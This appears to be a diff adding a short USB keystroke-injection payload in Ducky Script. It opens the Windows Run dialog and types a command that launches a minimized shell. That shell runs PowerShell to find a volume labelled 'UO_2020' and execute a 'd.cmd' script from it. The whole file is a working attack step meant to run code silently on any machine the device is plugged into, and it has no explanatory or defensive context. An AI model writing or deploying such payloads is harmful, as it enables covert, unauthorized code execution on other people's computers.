@@ -1,0 +1,5 @@
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd /C "start /MIN cmd /C powershell ".((gwmi win32_volume -f 'label=''UO_2020''').Name+'d.cmd')""
+ENTER
